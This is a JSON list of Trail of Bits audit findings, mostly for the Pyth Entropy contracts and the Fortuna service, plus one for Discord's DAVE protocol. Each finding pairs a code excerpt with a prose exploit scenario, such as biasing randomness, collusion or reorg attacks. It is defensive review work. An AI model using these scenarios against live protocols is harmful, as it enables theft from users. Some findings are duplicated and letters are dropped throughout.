contract will be permanently locked, barring a contract upgrade. Exploit Scenario The Entropy system accrues 1 ether of Pyth protocol fees. Alice, a Pyth team member, goes to withdraw the fees but realizes she cannot because the functionality is missing from the contract. The Pyth team must upgrade the contract to add this functionality. Recommendations Short term, add a withdrawal function that allows an authorized user to withdraw the accrued Pyth protocol fee from the Entropy contract. Consider also adding a withdrawal function, or allowing value to be attached to the low-level call, in the Executor contract. Long term, improve the coverage of the Wallet testing suite and ensure that all system components and functionality are thoroughly tested.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Lack of contract existence check on low-level call ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-pyth-entropy-securityreview.pdf",
        "body": "The Executor contract uses a low-level call on arbitrary receivers but does not implement a contract existence check. If the call receiver is set to an incorrect address, such as an externally owned account (EOA), the call will succeed and could cause the protocol team to incorrectly assume that the attempted action has been performed. The Executor contract is intended to execute messages that were previously transmitted and veried using the Wormhole cross-chain bridge in order to perform governance- approved actions on the receiver chain. This is done by calling the execute function with the appropriate encoded message, as shown in gure 2.1. function execute ( bytes memory encodedVm ) public returns ( bytes memory response) { IWormhole.VM memory vm = verifyGovernanceVM(encodedVm); GovernanceInstruction memory gi = parseGovernanceInstruction( vm.payload ); if (gi.targetChainId != chainId && gi.targetChainId != 0 ) revert ExecutorErrors.InvalidGovernanceTarget(); if ( gi.action != ExecutorAction.Execute || gi.executorAddress != address ( this ) ) revert ExecutorErrors.DeserializationError(); bool success ; (success, response) = address (gi.callAddress).call(gi.callData); // Check if the call was successful or not. if (!success) { // If there is return data, the delegate call reverted with a reason or a custom error, which we bubble up. if (response.length > 0 ) { // The first word of response is the length, so when we call revert we add 1 word (32 bytes) // to give the pointer to the beginning of the revert data and pass the size as the second argument. assembly { let returndata_size := mload(response) revert(add( 32 , response), returndata_size) } } else { revert ExecutorErrors.ExecutionReverted(); } } } Figure 2.1: The execute function of Executor.sol However, if the gi.callAddress parameter is mistakenly set to an EOA, the call will always succeed. Because the call to execute does not revert, the protocol team may assume that important actions have been performed, even though no action has been executed. Exploit Scenario Alice, a Pyth team member, submits a cross-chain message through Wormhole to execute a time-sensitive transaction but inputs the wrong gi.callAddress . She calls execute with the message data, which passes because the call is made to an EOA. Alice believes the intended transaction was successful and only realizes her mistake after it is too late to resubmit the correct message. Recommendations Short term, implement a contract existence check before the low-level call to ensure that the call reverts if the receiver is an EOA. Long term, carefully review the Solidity documentation , especially the Warnings section about using low-level call operations.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Lack of two-step process for critical operations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-pyth-entropy-securityreview.pdf",
        "body": "When called, the transferOwnership function immediately sets the contract owner to the provided address. The use of a single step to make such a critical change is error-prone; if the function is called with erroneous input, the results could be irrevocable or dicult to recover from. The EntropyUpgradeable contract inherits ownership logic from the OpenZeppelin OwnableUpgradeable contract, which allows the current owner to transfer the contract ownership to another address using the transferOwnership function, as shown in gure 3.1. function transferOwnership ( address newOwner ) public virtual onlyOwner { require (newOwner != address ( 0 ), \"Ownable: new owner is the zero address\" ); _transferOwnership(newOwner); } Figure 3.1: The transferOwnershi p function of OwnableUpgradeable.sol The system also denes an administrator address that can be updated by calling the EntropyGovernance contracts setAdmin function, as shown in gure 3.2. function setAdmin ( address newAdmin ) external { _authoriseAdminAction(); address oldAdmin = _state.admin; _state.admin = newAdmin; emit AdminSet(oldAdmin, newAdmin); } Figure 3.2: The setAdmin function of EntropyGovernance.sol Both of these critical operations are done in a single step. If the functions are called with erroneous input, the Pyth team could lose the ability to upgrade the contract or set important system parameters. Exploit Scenario Alice invokes transferOwnership to change the contract owner but accidentally enters the wrong address. She permanently loses access to the contract. Recommendations Short term, implement a two-step process for all irrecoverable critical operations, such as by replacing the OwnableUpgradeable contract with the Ownable2StepUpgradeable contract. Consider splitting the setAdmin function into a proposeAdmin function, which proposes the new admin address, and an acceptAdmin function, which sets the new admin address and can be called only by the proposed admin. This will guarantee that the admin-setting party must be able call the contract from the proposed address before they are actually set as the new owner. Long term, identify and document all possible actions that can be taken by privileged accounts, along with their associated risks. This will facilitate reviews of the codebase and prevent future mistakes.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Users can inuence the Entropy revealed result ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-pyth-entropy-securityreview.pdf",
        "body": "When revealing a requested random number that includes a block hash, users can choose between two random numbers by executing the reveal function in the same block as the request, or after 256 blocks. This gives each user two chances to receive a favorable result on each request. The Entropy system generates random numbers by using a commitment-and-reveal pattern, which requires the third-party integration to rst request a number and then later reveals the random number. This can be done by performing the following steps: 1. A user rst selects a number, which they must keep secret, and provides the hash of the number to the Entropy contracts request function, along with the address of the randomness provider and a ag that determines whether the block hash should be used when generating the result. 2. The user queries the provider o-chain to reveal their secret number so that the user can provide it in the next step. 3. The user calls the Entropy contracts reveal function and provides the address of the provider, the sequence number, and both secrets in order to obtain the resulting random number. The reveal function concatenates the user secret, the provider secret, and the block hash to generate the random number, as shown in the highlighted lines of gures 4.1 and 4.2. function reveal ( address provider , uint64 sequenceNumber , bytes32 userRandomness , bytes32 providerRevelation ) public override returns ( bytes32 randomNumber ) { EntropyStructs.Request storage req = findRequest( provider, sequenceNumber ); [...] bytes32 blockHash = bytes32 ( uint256 ( 0 )); if (req.useBlockhash) { blockHash = blockhash(req.blockNumber); } randomNumber = combineRandomValues( userRandomness, providerRevelation, blockHash ); [...] } Figure 4.1: The revea l function of Entropy.sol function combineRandomValues ( bytes32 userRandomness , bytes32 providerRandomness , bytes32 blockHash ) public pure override returns ( bytes32 combinedRandomness ) { combinedRandomness = keccak256 ( abi.encodePacked(userRandomness, providerRandomness, blockHash) ); } Figure 4.2: The combineRandomValues function of Entropy.sol However, if the request species that the block hash should be used to generate the random number, this gives the user one additional random number and allows them to select whichever one is more favorable for them. This is because the blockhash function returns zero if the req.blockNumber variable is equal to the current block number, or if it is not within the 256 most recent blocks. Exploit Scenario A gambling protocol integrates with the Entropy contract to generate random numbers for their draws. They specify that the block hash must be used to generate the number but allow users to choose when to reveal the number with the limitation that if a number is not revealed within one day of the draw, the protocol will automatically mark the user as having lost the draw. Eve notices that she can receive two random numbers (doubling her chances of success) by selecting when to reveal, and she submits multiple requests. She simulates the result of the draw for each of the two random numbers she can generate for that draw and ultimately chooses the winning number. Recommendations Short term, add validation when using the block hash to ensure that the reveal function reverts if the returned block hash is zero. Long term, carefully review the Solidity documentation and ensure that the risks of using the blockhash function, especially as they relate to randomness generation, are well documented and understood .",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Integrating protocols may be vulnerable to multiparty collusion attacks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-pyth-entropy-securityreview.pdf",
        "body": "Users and providers may be able to collude to extract value from systems integrating with the Entropy RNG protocol. The Pyth Entropy contract works via a two-party commitment-and-reveal protocol. The nal generated value is derived from two secret seed values generated by the user and the provider. Each party must submit a hiding commitment to their seed before they can learn the seed of the other party. When the blockhash option is enabled, the resulting value additionally incorporates the hash of the block containing the request. When the blockhash option is not enabled, the user and provider in multiparty settings may collude to bias the output of the contract, potentially extracting value from third parties. These attacks are very dicult to detect, as they are outwardly identical to low-probability events occurring by random chance. When the blockhash option is enabled, biasing the output requires participation from the user, the provider, and a block proposer. Integrating protocols and their users may not be aware of the Entropy protocols underlying trust assumptions. While there are some in-code comments describing the non-collusion assumption, there is little in the way of user-facing documentation about assumptions or code examples demonstrating secure integration in multiparty settings. The following are some use-case scenarios in which higher-level protocols may be vulnerable to collusion attacks: 1. An NFT sale uses the Entropy service to determine attributes, and thus value, of newly minted NFTS. In this situation, the user is the buyer of the NFT and the provider is controlled by the NFT creator. The NFT creator may pose as a user and collude with the entropy provider to create biased outputs and mint themselves valuable, rare NFTs, secretly reducing the value available to honest buyers. 2. Another NFT sale uses a third-party entropy provider that is not controlled by the NFT creator. The third-party provider may purchase NFTs and use their knowledge of provider seeds to bias the output and receive high-value NFTs. 3. A single-winner lottery decentralized application (dapp) chooses a winner by paying out to the user whose entropy value is lowest. The entropy provider purchases a ticket and manipulates their entropy outcome to be lower than other players, depriving them of a fair chance at winning the lottery. 4. A single-winner lottery dapp chooses a winner by combining the entropy value of each user into a single value. A user can bias the output by choosing not to reveal their seed. If the user owns many tickets, the resulting bias may earn the user more in expectations than the cost of forfeiting one lottery ticket. Exploit Scenario Alice, a randomness provider, deploys a gambling contract on Ethereum that integrates with the Entropy system and sets herself as the randomness provider. The contract attracts 10 ether of value from other users. Alice additionally stakes enough Ether to become a validator and waits for a slot in which she is the block proposer. Alice, aware of the provider's secret, generates several candidate blocks, each containing a request with a distinct user commitment. Knowing all three of the user secret, provider secret, and candidate block hash, Alice can easily choose the candidate block that maximizes her chances of winning the lottery. She uses this knowledge to win the gamble and the 10 ether of deposited value. Recommendations Short term, explicitly document the trust considerations and recommended architectures for common use cases. Provide code examples demonstrating multiuser systems and elaborate on the trust issues involved. Long term, consider implementing an architecture that allows fewer concentrated trust assumptions, such as a threshold veriable random function (VRF) or a zkSNARK-based veriable delay function (VDF).",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Lack of zero-value checks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-pyth-entropy-securityreview.pdf",
        "body": "Certain setter functions and constructors fail to validate incoming arguments, so callers of these functions, or the deployer of the contracts, could mistakenly set important state variables to a zero value, misconguring the system. For example, the Executor contract constructor sets multiple parameters, including the wormhole address, which is the address of the Wormhole contract used to verify encoded messages. constructor ( address _wormhole , uint64 _lastExecutedSequence , uint16 _chainId , uint16 _ownerEmitterChainId , bytes32 _ownerEmitterAddress ) { } wormhole = IWormhole(_wormhole); lastExecutedSequence = _lastExecutedSequence; chainId = _chainId; ownerEmitterChainId = _ownerEmitterChainId; ownerEmitterAddress = _ownerEmitterAddress; Figure 6.1: The constructor of Executor.sol If the wormhole address is set to a zero value, the contract will be unable to execute transactions and will need to be redeployed. The lack of zero-value checks is prevalent in the following contracts and functions:  Executor.sol  constructor  Entropy.sol  _initialize function  EntropyGovernance.sol  setAdmin function  setPythFee function  setDefaultProvider function Exploit Scenario Alice deploys the Executor contract with a miscongured wormhole address. As a result, the contract is unable to function, requiring Alice to redeploy it and pay the deployment fee again. Recommendations Short term, add zero-value checks to all function and constructor arguments to ensure that callers cannot set incorrect values and miscongure the system. Long term, use the Slither static analyzer to catch common issues such as this one. Consider integrating a Slither scan into the projects CI pipeline, pre-commit hooks, or build scripts.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Entropy providers may reveal seed before request is nalized ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-pyth-entropy-securityreview.pdf",
        "body": "The Fortuna entropy provider service determines a chains nality based on the number of conrmations (i.e., the number of blocks that include a given transaction in a parent block). This measure of nality is adequate for blockchains with probabilistic nality (e.g., Ethereum proof-of-work [PoW], Avalanche) and chains with instant nality (e.g., Solana, Tendermint) but is not adequate for Ethereum proof-of-stake (PoS) or L2s based on it. Ethereums consensus exhibits eventual nality, more commonly referred to as a nality gadget . Consensus systems using nality gadgets allow new blocks to be created when only one-third of the validator set is active and online. These blocks are organized into batches called epochs. At the end of an epoch, the validator set votes to nalize all the blocks in the epoch. This nalization requires two-thirds of the validator set to be honest in order to succeed. If a chain using a nality gadget is attacked, an attacker may be able to prevent the chain from nalizing new epochs. However, since the act of creating new blocks has much better liveness properties, the chain will continue to produce blocks regardless of whether the nality gadget has stalled. This means that it is possible for many epochs to pass and remain unnalized, which creates the possibility of extraordinarily long block reorgs under worst-case conditions. Because a reorg may allow a user to change their entropy commitment, it is imperative that the randomness provider not reveal their seed for the corresponding sequence number until the users request is nal. Conrmation delays have no bearing on whether a block in Ethereum PoS is nal. Exploit Scenario An attacker discovers a bug in an Ethereum consensus client and obtains the ability to prevent the chain from nalizing for several epochs. The attacker also controls several validators that have upcoming block proposal slots. The attacker then submits a request transaction that includes some entropy commitment. Once the transaction is included in a block, the attacker begins an attack to prevent the chain from nalizing. This attack must continue for longer than the period indicated by the reveal_delay_blocks variable. Once the correct number of blocks has passed, the attacker requests the corresponding entropy seed from the randomness provider. The attacker uses the providers entropy to brute force a desirable new user seed. They then force a reorg of the chain to a point before the initial request transaction and submit a new transaction with the commitment corresponding to the alternative seed. After this, the attacker can generate a new entropy result that is arbitrarily biased in their favor, potentially causing loss of funds in the higher-level protocol. Recommendations Short term, validate API requests for entropy revelation by checking the presence of a corresponding request at the most recent nalized block. Figure 7.1 provides a suggestion of how to do this using the ethers-rs library: let r = self .get_request(provider_address, sequence_number) .block(ethers::core::types::BlockNumber::Finalized) .call() . await ?; Figure 7.1: Use of nalized block to prevent reorg attacks ( fortuna/src/chain/ethereum.rs:19019 3 ) Long term, research the nality conditions of each chain to be supported, and ensure that providers do not reveal seeds before user commitments are nalized. References  The Engineers Guide To Finality  Post-Mortem Report: Ethereum Mainnet Finality (05/11/2023)",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Fortuna entropy seed does not bind provider identity ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-pyth-entropy-securityreview.pdf",
        "body": "The Fortuna entropy provider service derives the base seed for individual hash chains by combining a master secret with a random nonce, the hash chain length, and the blockchain ID. The use of the blockchain ID prevents a provider from unintentionally revealing seeds on one chain that might be later used on another chain. However, the derivation does not include the providers address. Figure 8.1 shows the derivation of a hash chain seed from a master secret: pub fn from_config ( secret: &str , chain_id: & ChainId , random: & [ u8 ; 32 ], chain_length: u64 , ) -> Result < Self > { let mut input: Vec < u8 > = vec! []; input.extend_from_slice(&hex::decode(secret)?); input.extend_from_slice(&chain_id.as_bytes()); input.extend_from_slice(random); let secret: [ u8 ; 32 ] = Keccak256::digest(input).into(); Ok ( Self ::new(secret, chain_length.try_into()?)) } Figure 8.1: The hash chain derivation does not include the providers address. ( pyth-crosschain/fortuna/src/state.rs#3548 ) Because the master seed is passed into the Fortuna application separately from the provider private key, it is possible that a miscongured application use could result in the same entropy secret being used with two dierent provider accounts. Under most circumstances, reuse of a master secret would not lead to an exploit due to the use of a random nonce to instantiate individual hash chains; new hash chains generated under the second provider address would be unlinkable to entropy generated by the rst. However, upon startup, the Fortuna service retrieves the random nonce from on-chain commitment metadata, as shown in gure 8.2. Thus, if an honest Fortuna instance is run using a constant entropy seed and a potentially untrusted provider address, the owner of the untrusted address could duplicate a commitment from the honest provider and extract entropy values that could be used to bias the outcome of Entropy queries from the trusted provider. let provider_info = contract.get_provider_info(opts.provider).call(). await ?; ... let metadata = bincode::deserialize::<CommitmentMetadata>(&provider_info.commitment_metadata)?; let hash_chain = PebbleHashChain::from_config( &opts.randomness.secret, &chain_id, &metadata.seed, metadata.chain_length, )?; Figure 8.2: Fortuna fetches a random nonce from the blockchain. ( pyth-crosschain/fortuna/src/command/run.rs#5471 ) This issue requires an unusual misconguration and use case for the Fortuna service, but due to the use of environment variables to store the secret values ( TOB-ENTR-9 ), miscongurations of this variety are far from impossible. Exploit Scenario An honest hosting service oers to run the Fortuna application on behalf of entropy providers, who supply their blockchain private key to the hosting service to enable the service to run on the providers behalf. The hosting service fails to properly regenerate the FORTUNA_SECRET environment variable when changing providers. Alice, an honest provider, uses the hosting service to generate entropy for an NFT mint. The hosting service generates a hash chain and uploads a commitment for Alices entropy. Mallory, a malicious user, observes Alices commitment and registers an identical commitment under Mallorys own provider. She then supplies her private key to the hosting provider and submits several requests for entropy. Because the entropy is not bound to the provider account, the revealed values will be the same as for future requests to Alices service. Mallory then uses her knowledge of Alices entropy seeds to generate biased values during the NFT mint, obtaining valuable NFTs unfairly. Recommendations Short term, include the provider address as a component in the derivation of base seeds for new hash chains. Long term, consider also including the initial sequence number and any other information necessary to uniquely identify a hash chain.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Secrets appear in environment variables and command-line arguments ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-pyth-entropy-securityreview.pdf",
        "body": "The Fortuna application expects the provider private key and master entropy seed to be passed through the command-line interface (CLI) arguments --private-key and --secret , or via the environment variables PRIVATE_KEY and FORTUNA_SECRET . As a result, an attacker with access to a dierent unprivileged user on the machine may, under some congurations, be able to learn the secrets being used by the Fortuna service. On many Linux machines, any user can read environment variables and command-line ags via the procfs lesystem. Additionally, secrets may be unintentionally logged to the .bash_history le, which could have undesirably broad read permissions. Exploit Scenario An attacker exploits another process on the same host as Fortuna and uses it to learn the entropy seed or provider secret key from the list of processes. Recommendations Short term, have the code read secrets from a le on disk or prompt for secrets at runtime. Long term, ensure that no secrets are passed via command-line arguments. Consider encrypting local secrets at rest or documenting integration with a secret storage solution such as HashiCorp Vault or Square Keywhiz.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Calls to the reveal function may succeed on inactive requests ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-pyth-entropy-securityreview.pdf",
        "body": "Revealing inactive Entropy requests may succeed due to missing validation, allowing requests with a sequence number of zero to be revealed. The Entropy contract uses a commitment-and-reveal scheme to generate random numbers. Users can request a random number from any registered randomness provider by using the request function, and once the provider has shared their secret with them, they can reveal the resulting random number by calling the reveal function. This function nds the corresponding request based on the provider address and the request sequence number, performs validation on it, and then nally clears the request so that it cannot be reexecuted, as shown in gure 10.1. function reveal ( address provider , uint64 sequenceNumber , bytes32 userRandomness , bytes32 providerRevelation ) public override returns ( bytes32 randomNumber ) { EntropyStructs.Request storage req = findRequest( provider, sequenceNumber ); // Check that there is a request for the given provider / sequence number. if (req.provider != provider || req.sequenceNumber != sequenceNumber) revert EntropyErrors.NoSuchRequest(); if (req.requester != msg.sender ) revert EntropyErrors.Unauthorized(); [...] clearRequest(provider, sequenceNumber); [...] } Figure 10.1: The reveal function of Entropy.sol The findRequest function generates the request keysthe short key representing an index in the _state.requests xed-size array and the key representing a key in the _state.requestsOverflow mappingand matches one of the requests, as shown in gure 10.2. function findRequest ( address provider , uint64 sequenceNumber ) internal view returns (EntropyStructs.Request storage req) { ( bytes32 key , uint8 shortKey ) = requestKey(provider, sequenceNumber); req = _state.requests[shortKey]; if (req.provider == provider && req.sequenceNumber == sequenceNumber) { return req; } else { req = _state.requestsOverflow[key]; } } Figure 10.2: The findRequest function of Entropy.sol When clearing a request at the end of a reveal, the clearRequest function either deletes the request from the _state.requestsOverflow mapping or invalidates it by setting the sequence number of the request to zero, as shown in gure 10.3. function clearRequest ( address provider , uint64 sequenceNumber ) internal { ( bytes32 key , uint8 shortKey ) = requestKey(provider, sequenceNumber); EntropyStructs.Request storage req = _state.requests[shortKey]; if (req.provider == provider && req.sequenceNumber == sequenceNumber) { req.sequenceNumber = 0 ; } else { delete _state.requestsOverflow[key]; } } Figure 10.3: The clearRequest function of Entropy.sol However, while a request with a sequence number of zero is considered inactive, the reveal function does not revert if sequence number zero is passed as an input to the function. Since the _state.requests xed-sized array has a size of 32 elements, it is reasonable to assume that two dierent sequence numbers could result in the same short key, allowing inactive requests to be revealed. Recommendations Short term, add validation to the reveal function to ensure that it reverts if the sequence number is zero. Long term, use advanced testing techniques such as fuzzing to more easily discover issues such as this. Dening a property that an inactive request cannot be revealed and using Echidna to test the property could help discover this issue. 11. Insu\u0000cient unit tests for Fortuna Severity: Informational Diculty: Not Applicable Type: Testing Finding ID: TOB-ENTR-11 Target: Fortuna application",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. Fortuna entropy seed does not bind provider identity ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-pyth-entropy-securityreview.pdf",
        "body": "The Fortuna entropy provider service derives the base seed for individual hash chains by combining a master secret with a random nonce, the hash chain length, and the blockchain ID. The use of the blockchain ID prevents a provider from unintentionally revealing seeds on one chain that might be later used on another chain. However, the derivation does not include the providers address. Figure 8.1 shows the derivation of a hash chain seed from a master secret: pub fn from_config ( secret: &str , chain_id: & ChainId , random: & [ u8 ; 32 ], chain_length: u64 , ) -> Result < Self > { let mut input: Vec < u8 > = vec! []; input.extend_from_slice(&hex::decode(secret)?); input.extend_from_slice(&chain_id.as_bytes()); input.extend_from_slice(random); let secret: [ u8 ; 32 ] = Keccak256::digest(input).into(); Ok ( Self ::new(secret, chain_length.try_into()?)) } Figure 8.1: The hash chain derivation does not include the providers address. ( pyth-crosschain/fortuna/src/state.rs#3548 ) Because the master seed is passed into the Fortuna application separately from the provider private key, it is possible that a miscongured application use could result in the same entropy secret being used with two dierent provider accounts. Under most circumstances, reuse of a master secret would not lead to an exploit due to the use of a random nonce to instantiate individual hash chains; new hash chains generated under the second provider address would be unlinkable to entropy generated by the rst. However, upon startup, the Fortuna service retrieves the random nonce from on-chain commitment metadata, as shown in gure 8.2. Thus, if an honest Fortuna instance is run using a constant entropy seed and a potentially untrusted provider address, the owner of the untrusted address could duplicate a commitment from the honest provider and extract entropy values that could be used to bias the outcome of Entropy queries from the trusted provider. let provider_info = contract.get_provider_info(opts.provider).call(). await ?; ... let metadata = bincode::deserialize::<CommitmentMetadata>(&provider_info.commitment_metadata)?; let hash_chain = PebbleHashChain::from_config( &opts.randomness.secret, &chain_id, &metadata.seed, metadata.chain_length, )?; Figure 8.2: Fortuna fetches a random nonce from the blockchain. ( pyth-crosschain/fortuna/src/command/run.rs#5471 ) This issue requires an unusual misconguration and use case for the Fortuna service, but due to the use of environment variables to store the secret values ( TOB-ENTR-9 ), miscongurations of this variety are far from impossible. Exploit Scenario An honest hosting service oers to run the Fortuna application on behalf of entropy providers, who supply their blockchain private key to the hosting service to enable the service to run on the providers behalf. The hosting service fails to properly regenerate the FORTUNA_SECRET environment variable when changing providers. Alice, an honest provider, uses the hosting service to generate entropy for an NFT mint. The hosting service generates a hash chain and uploads a commitment for Alices entropy. Mallory, a malicious user, observes Alices commitment and registers an identical commitment under Mallorys own provider. She then supplies her private key to the hosting provider and submits several requests for entropy. Because the entropy is not bound to the provider account, the revealed values will be the same as for future requests to Alices service. Mallory then uses her knowledge of Alices entropy seeds to generate biased values during the NFT mint, obtaining valuable NFTs unfairly. Recommendations Short term, include the provider address as a component in the derivation of base seeds for new hash chains. Long term, consider also including the initial sequence number and any other information necessary to uniquely identify a hash chain. 9. Secrets appear in environment variables and command-line arguments Severity: Informational Diculty: High Type: Data Exposure Finding ID: TOB-ENTR-9 Target: fortuna/src/config",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Calls to the reveal function may succeed on inactive requests ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-pyth-entropy-securityreview.pdf",
        "body": "Revealing inactive Entropy requests may succeed due to missing validation, allowing requests with a sequence number of zero to be revealed. The Entropy contract uses a commitment-and-reveal scheme to generate random numbers. Users can request a random number from any registered randomness provider by using the request function, and once the provider has shared their secret with them, they can reveal the resulting random number by calling the reveal function. This function nds the corresponding request based on the provider address and the request sequence number, performs validation on it, and then nally clears the request so that it cannot be reexecuted, as shown in gure 10.1. function reveal ( address provider , uint64 sequenceNumber , bytes32 userRandomness , bytes32 providerRevelation ) public override returns ( bytes32 randomNumber ) { EntropyStructs.Request storage req = findRequest( provider, sequenceNumber ); // Check that there is a request for the given provider / sequence number. if (req.provider != provider || req.sequenceNumber != sequenceNumber) revert EntropyErrors.NoSuchRequest(); if (req.requester != msg.sender ) revert EntropyErrors.Unauthorized(); [...] clearRequest(provider, sequenceNumber); [...] } Figure 10.1: The reveal function of Entropy.sol The findRequest function generates the request keysthe short key representing an index in the _state.requests xed-size array and the key representing a key in the _state.requestsOverflow mappingand matches one of the requests, as shown in gure 10.2. function findRequest ( address provider , uint64 sequenceNumber ) internal view returns (EntropyStructs.Request storage req) { ( bytes32 key , uint8 shortKey ) = requestKey(provider, sequenceNumber); req = _state.requests[shortKey]; if (req.provider == provider && req.sequenceNumber == sequenceNumber) { return req; } else { req = _state.requestsOverflow[key]; } } Figure 10.2: The findRequest function of Entropy.sol When clearing a request at the end of a reveal, the clearRequest function either deletes the request from the _state.requestsOverflow mapping or invalidates it by setting the sequence number of the request to zero, as shown in gure 10.3. function clearRequest ( address provider , uint64 sequenceNumber ) internal { ( bytes32 key , uint8 shortKey ) = requestKey(provider, sequenceNumber); EntropyStructs.Request storage req = _state.requests[shortKey]; if (req.provider == provider && req.sequenceNumber == sequenceNumber) { req.sequenceNumber = 0 ; } else { delete _state.requestsOverflow[key]; } } Figure 10.3: The clearRequest function of Entropy.sol However, while a request with a sequence number of zero is considered inactive, the reveal function does not revert if sequence number zero is passed as an input to the function. Since the _state.requests xed-sized array has a size of 32 elements, it is reasonable to assume that two dierent sequence numbers could result in the same short key, allowing inactive requests to be revealed. Recommendations Short term, add validation to the reveal function to ensure that it reverts if the sequence number is zero. Long term, use advanced testing techniques such as fuzzing to more easily discover issues such as this. Dening a property that an inactive request cannot be revealed and using Echidna to test the property could help discover this issue.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "11. Insu\u0000cient unit tests for Fortuna ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-pyth-entropy-securityreview.pdf",
        "body": "The Fortuna Rust codebase currently contains only two tests, both exercising aspects of the entropy revelation component of Fortuna. However, Fortuna comprises several other functionalities, such as provider registration and entropy request generation. The overall statement test coverage, as measured by cargo llvm-cov , is less than 20%. Additionally, the testing codebase currently relies on mocked versions of the Entropy contract ABI. Failing to routinely exercise the ethers-rs components and realistic chain behavior may lead to undiscovered bugs and unexpected failures. Recommendations Short term, add unit and integration tests for all subcommands of the Fortuna service. Long term, add integration tests exercising the full set of Fortuna commands against a local blockchain testnet node in a faithful simulation of real-world use.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Not Applicable"
        ]
    },
    {
        "title": "12. Provider may earn fees without disclosing entropy ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-pyth-entropy-securityreview.pdf",
        "body": "Entropy providers may set a congurable fee as compensation for providing the entropy. However, they may collect the fee without disclosing their entropy to the user and thus collect fees simply by registering once and then going oine. Users must pay the provider fee as part of submitting a request, at which point the funds are immediately available for withdrawal by the provider, as demonstrated in gure 12.1. function request ( address provider , bytes32 userCommitment , bool useBlockHash ) public payable override returns ( uint64 assignedSequenceNumber ) { ... // Check that fees were paid and increment the pyth / provider balances. uint128 requiredFee = getFee(provider); if ( msg.value < requiredFee) revert EntropyErrors.InsufficientFee(); providerInfo.accruedFeesInWei += providerInfo.feeInWei; _state.accruedPythFeesInWei += (SafeCast.toUint128( msg.value ) - providerInfo.feeInWei); ... } Figure 12.1: Fees are credited immediately upon submission of a request. ( pyth-crosschain/target_chains/ethereum/contracts/contracts/entropy/Entro py.sol#176198 ) Because fees are credited to the provider immediately, there is little nancial incentive to keep the Fortuna service online. Exploit Scenario Alice registers a provider with the Entropy service, setting a 0.01 ETH fee for entropy. As a cost saving measure, Alice does not pay for redundant or high-availability hosting infrastructure for the Fortuna service. An NFT protocol uses Alice as the entropy provider for a randomized mint. Alices Fortuna server goes down for several hours, causing users to miss the 256-block revelation window for block hashbased entropy. Alice, however, still collects the fees from the randomness that she never provided. Recommendations Short term, lock user funds upon submission of a request , but credit the funds to the provider only upon completion of the reveal operation. Long term, consider allowing providers to submit entropy seeds on their own behalf and collect fees if the user goes oine. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Commit spam could prevent group updates ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-08-discord-dave-protocol-designreview.pdf",
        "body": "The section on commit ordering in the design document states that the signaling server will broadcast the rst commit seen for each epoch to all members of the group. If a committing member starts spamming the group with new commits, this could eectively prevent other members from committing, which would prevent meaningful group updates and cause unnecessary load on the symmetric encryption mechanism. The section on key rotation mentions rate limiting empty commits to avoid unnecessary key updates. This may also mitigate this issue, depending on how the system handles Add and Remove proposals. The documentation states the following restrictions on Add and Remove proposals: Commits including add proposals are only valid if the added member is present in the member list received from the delivery service. Commits including removal proposals are only valid if the removed member is removed from the member list received from the delivery service. However, if a member can include Add and Remove proposals for members who were previously added or removed from the group, this could still be an issue. Exploit Scenario A malicious user with a privileged network position spams the network with commits containing Add and Remove proposals for previous members (who have already been added and removed once from the group). Since the server broadcasts only the rst commit obtained in each epoch, this eectively prevents anyone else from committing to the group. In particular, new members cannot be added, and the malicious user cannot be removed. 12 Discord DAVE Protocol Cryptographic Design Review Recommendations Short term, disallow empty commits to the group when there are outstanding Add or Remove proposals to the group. Long term, disallow group members from submitting any proposals and instead use external proposals to add and remove members. Require the DS to broadcast only commits that contain the full set of current proposals, and validate the commits to ensure that all credentials are authentic. Key rotation may be implemented by external Psk proposals. For the DS to validate handshake messages, they must be sent as unencrypted PublicMessage objects. These handshake messages should be point-to-point encrypted and authenticated using TLS. 13 Discord DAVE Protocol Cryptographic Design Review",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Undetermined"
        ]
    },
    {
